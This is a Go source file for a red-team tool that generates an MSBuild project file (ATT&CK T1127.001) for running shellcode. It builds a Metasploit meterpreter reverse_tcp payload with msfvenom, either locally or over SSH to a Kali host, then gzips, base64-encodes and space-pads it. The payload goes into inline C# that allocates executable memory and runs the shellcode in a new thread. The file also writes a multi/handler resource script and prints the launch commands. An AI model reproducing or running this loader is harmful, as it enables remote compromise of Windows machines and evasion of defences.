package main

// Use the GOPATH for development and then transition over to the prep script
// go env -w GOPATH="/home/thepcn3rd/go/workspaces/buildXML_MSBuild"

// To cross compile for linux
// GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o xml.bin -ldflags "-w -s" main.go

// To cross compile windows
// GOOS=windows GOARCH=amd64 go build -o xml.exe -ldflags "-w -s" main.go

/*


References:
https://gist.githubusercontent.com/dxflatline/99de0da360a13c565a00a1b07b34f5d1/raw/63586f21b84d28c121418ab78620932ec9c546e6/msbuild_sc_alloc.csproj
file:///home/thepcn3rd/Downloads/Ascension.pdf
https://attack.mitre.org/techniques/T1127/001/
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127.001/src/T1127.001.csproj


*/

import (
	"encoding/base64"
	"encoding/json"
	"encoding/xml"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"

	cf "github.com/thepcn3rd/goAdventures/projects/commonFunctions"
	"golang.org/x/crypto/ssh"
)

type Project struct {
	XMLName      xml.Name  `xml:"Project"`
	ToolsVersion string    `xml:"ToolsVersion,attr"`
	Xmlns        string    `xml:"xmlns,attr"`
	Target       Target    `xml:"Target"`
	UsingTask    UsingTask `xml:"UsingTask"`
}

type Target struct {
	Name    string    `xml:"Name,attr"`
	Execute *struct{} `xml:"MyExecute,omitempty"`
}

type UsingTask struct {
	TaskName       string    `xml:"TaskName,attr"`
	TaskFactory    string    `xml:"TaskFactory,attr"`
	AssemblyFile   string    `xml:"AssemblyFile,attr"`
	ParameterGroup *struct{} `xml:"ParameterGroup"`
	Task           Task      `xml:"Task"`
}

type Task struct {
	Using []Using `xml:"Using"`
	Code  Code    `xml:"Code"`
}

type Using struct {
	Namespace string `xml:"Namespace,attr"`
}

type Code struct {
	Type     string `xml:"Type,attr"`
	Language string `xml:"Language,attr"`
	CDATA    string `xml:",cdata"`
}

type Config struct {
	OutputFile               string                 `json:"outputFile"`
	OutputFileResourceScript string                 `json:"outputFileResourceScript"`
	CustomPayload            string                 `json:"customPayload"`
	SSHConfig                sshConfigStruct        `json:"sshConfig"`
	MetasploitConfig         metasploitConfigStruct `json:"metasploitConfig"`
}

type sshConfigStruct struct {
	SSHKali           string `json:"sshKali"`
	SSHUsername       string `json:"sshUsername"`
	SSHPubKeyLocation string `json:"sshPubKeyLocation"`
	SSHHost           string `json:"sshHost"`
}

type metasploitConfigStruct struct {
	Payload string `json:"payload"`
	LHOST   string `json:"LHOST"`
	LPORT   string `json:"LPORT"`
}

// Note that the assembly file may be different depending on the landing...
func populateXML() Project {
	xmlData := `
	<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
		<Target Name="buildApp">
			<MyExecute />
		</Target>
		<UsingTask TaskName="MyExecute" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
			<ParameterGroup/>
			<Task>
				<Using Namespace="System" />
				<Using Namespace="System.Reflection" />
				<Code Type="Class" Language="cs">

					<![CDATA[
						CSHARPDATA
					]]>
					
				</Code>
			</Task>
		</UsingTask>
	</Project>
	`

	var p Project
	err := xml.Unmarshal([]byte(xmlData), &p)
	// You need to create an empty struct for a self-closing tag
	//p.Target.Execute = new(struct{})
	cf.CheckError("Unable to unmarshal the xmlData provided", err, true)

	return p
}

func populateCSharp(payload string) string {
	csharpData := `

				using System;
				using System.IO;
				using Microsoft.Build.Framework;
				using Microsoft.Build.Utilities;
				using System.IO.Compression;
				using System.Runtime.InteropServices;
				using System.Threading;
				
				public class MyExecute :  Task, ITask
				{
					public override bool Execute()
					{
						IntPtr scProcessHandle = IntPtr.Zero;

						String scB64 = "B64PAYLOADTEXT";
						scB64.Replace(" ", "");
						byte[] scGzip = Convert.FromBase64String(scB64);
						byte[] scC = Decompress(scGzip);
						scProcessHandle = execSC(scC);
						WaitForSingleObject(scProcessHandle, 0xFFFFFFFF);
						
						return true;
					}
					
					static byte[] Decompress(byte[] data)
					{
						using (var compressedStream = new MemoryStream(data))
						using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
						using (var resultStream = new MemoryStream())
						{
							zipStream.CopyTo(resultStream);
							return resultStream.ToArray();
						}
					}
					
					private static IntPtr execSC(byte[] sc)
					{
						UInt32 funcAddr = VirtualAlloc(0, (UInt32)sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
						Marshal.Copy(sc, 0, (IntPtr)(funcAddr), sc.Length);
						IntPtr hThread = IntPtr.Zero;
						UInt32 threadId = 0;
						IntPtr pinfo = IntPtr.Zero;
						hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
						return hThread;
					}

					private static UInt32 MEM_COMMIT = 0x1000;
					private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
					
					[DllImport("kernel32")]
					private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
					
					[DllImport("kernel32")]
					private static extern IntPtr CreateThread(
						UInt32 lpThreadAttributes,
						UInt32 dwStackSize,
						UInt32 lpStartAddress,
						IntPtr param,
						UInt32 dwCreationFlags,
						ref UInt32 lpThreadId
					);
					
					[DllImport("kernel32")]
					private static extern UInt32 WaitForSingleObject(
						IntPtr hHandle,
						UInt32 dwMilliseconds
					);
				}

	`
	csharpData = strings.Replace(csharpData, "B64PAYLOADTEXT", payload, -1)
	return csharpData
}

func publicKeyAuth(file string) ssh.AuthMethod {
	key, err := os.ReadFile(file)
	if err != nil {
		log.Fatalf("Unable to read private key: %v", err)
	}
	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		log.Fatalf("Unable to parse private key: %v", err)
	}
	return ssh.PublicKeys(signer)
}

func createPayload(c Config) string {
	// If in the config.json the setting is set to false it assumes that msfvenom executes locally
	command := "msfvenom --platform windows -p " + c.MetasploitConfig.Payload + " LHOST=" + c.MetasploitConfig.LHOST + " LPORT=" + c.MetasploitConfig.LPORT + " -f raw 2>/dev/null | gzip | base64 -w 0"
	if c.SSHConfig.SSHKali == "false" {
		cmd := exec.Command(command)
		outputCmdStr, err := cmd.Output()
		cf.CheckError("Unable to capture the output of the command", err, true)
		return string(outputCmdStr)
	} else {
		config := &ssh.ClientConfig{
			User: c.SSHConfig.SSHUsername,
			Auth: []ssh.AuthMethod{
				publicKeyAuth(c.SSHConfig.SSHPubKeyLocation), // replace with the path to your private key

			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		}

		client, err := ssh.Dial("tcp", c.SSHConfig.SSHHost+":22", config)
		cf.CheckError("Unable to connect to SSH host", err, true)
		defer client.Close()

		session, err := client.NewSession()
		cf.CheckError("Unable to create new SSH Session", err, true)
		defer session.Close()

		//command := "msfvenom --platform windows -p " + c.MetasploitConfig.Payload + " LHOST=" + c.MetasploitConfig.LHOST + " LPORT=" + c.MetasploitConfig.LPORT + " -f raw 2>/dev/null | gzip | base64 -w 0"
		output, err := session.CombinedOutput(command)
		cf.CheckError("SSH execution of the command failed", err, true)

		// Add spaces to the output
		outputStr := addSpaces(string(output))
		return string(outputStr)
	}

}

func createRSFile(c Config) string {
	rsFile := "use exploit/multi/handler\n"
	rsFile += "set payload " + c.MetasploitConfig.Payload + "\n"
	rsFile += "set LHOST " + c.MetasploitConfig.LHOST + "\n"
	rsFile += "set LPORT " + c.MetasploitConfig.LPORT + "\n"
	rsFile += "exploit\n"
	return rsFile
}

func addSpaces(input string) string {
	result := ""
	for _, char := range input {
		result += string(char) + "    " // Adding 4 spaces after each character
	}
	return result
}

func main() {
	var colorReset = "\033[0m"
	var colorGreen = "\033[32m"

	ConfigPtr := flag.String("conf", "config.json", "Configuration file to read")
	flag.Parse()

	// Create the config.json file if it does not exist...
	// Check if the default config.json file exists if it does not exist create it
	if !(cf.FileExists("/config.json")) {
		fmt.Println("File does not exist...")
		b64configDefault := "ewoJIm91dHB1dEZpbGUiOiAidGVzdC5jc3Byb2oiLAoJIm91dHB1dEZpbGVSZXNvdXJjZVNjcmlwdCI6ICJteS5ycyIsCgkiY3VzdG9tUGF5bG9hZCI6ICJOb25lIiwKCSJzc2hDb25maWciOiB7CgkJInNzaEthbGkiOiAidHJ1ZSIsCgkJInNzaFVzZXJuYW1lIjogInRoZXBjbjNyZCIsCgkJInNzaFB1YktleUxvY2F0aW9uIjogIi9ob21lL3RoZXBjbjNyZC8uc3NoL2lkX3JzYSIsCgkJInNzaEhvc3QiOiAiMTAuMjcuMjAuMTczIgoJfSwKCSJtZXRhc3Bsb2l0Q29uZmlnIjogewoJCSJwYXlsb2FkIjogIndpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV90Y3AiLAoJCSJMSE9TVCI6ICIxMC4yNy4yMC4xNzMiLAoJCSJMUE9SVCI6ICI1MjAwMCIKCX0KfQkK"
		b64decodedBytes, err := base64.StdEncoding.DecodeString(b64configDefault)
		cf.CheckError("Unable to decode the b64 of the config.json file", err, true)
		b64decodedString := string(b64decodedBytes)
		cf.SaveOutputFile(b64decodedString, "config.json")
		fmt.Println("Created the config.json file, take time to configure it...")
		os.Exit(0)
	}

	// Load the configuration file
	fmt.Println("Loading the following config file: " + *ConfigPtr + "\n")
	configFile, err := os.Open(*ConfigPtr)
	cf.CheckError("Unable to open the configuration file", err, true)
	defer configFile.Close()
	decoder := json.NewDecoder(configFile)
	var config Config
	if err := decoder.Decode(&config); err != nil {
		cf.CheckError("Unable to decode the configuration file", err, true)
	}

	// If customPayload is populated use the custom payload not the metasploit created payload
	var strPayload string
	if config.CustomPayload != "None" {
		strPayload = addSpaces(config.CustomPayload)
	} else {
		// SSH to Kali, Create the Payload based on config.json
		strPayload = createPayload(config)
	}

	project := populateXML()
	//fmt.Printf("%s\n", project.UsingTask.Task.Code.CDATA)

	project.UsingTask.Task.Code.CDATA = populateCSharp(strPayload)
	//fmt.Printf("%s\n\n", project.UsingTask.Task.Code.CDATA)

	rsFile := createRSFile(config)
	cf.SaveOutputFile(rsFile, config.OutputFileResourceScript)

	// Save the xml file
	xmlData, err := xml.MarshalIndent(project, "", "  ")
	cf.CheckError("Unable to marshall the XML data", err, true)
	cf.SaveOutputFile(string(xmlData), config.OutputFile)

	fmt.Printf("%sT1127.001 -  Trusted Developer Utilities Proxy Execution: MSBuild%s\n", colorGreen, colorReset)
	fmt.Printf("Output File to Build: %s\n", config.OutputFile)
	fmt.Printf("Output Resource File for Metasploit: %s\n\n", config.OutputFileResourceScript)
	fmt.Printf("%sExecute on Kali with the following:%s\n", colorGreen, colorReset)
	fmt.Printf("msfconsole -r %s\n\n", config.OutputFileResourceScript)
	fmt.Printf("%sExecute on Winders with the following:%s\n", colorGreen, colorReset)
	fmt.Printf("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe %s\n\n", config.OutputFile)

}
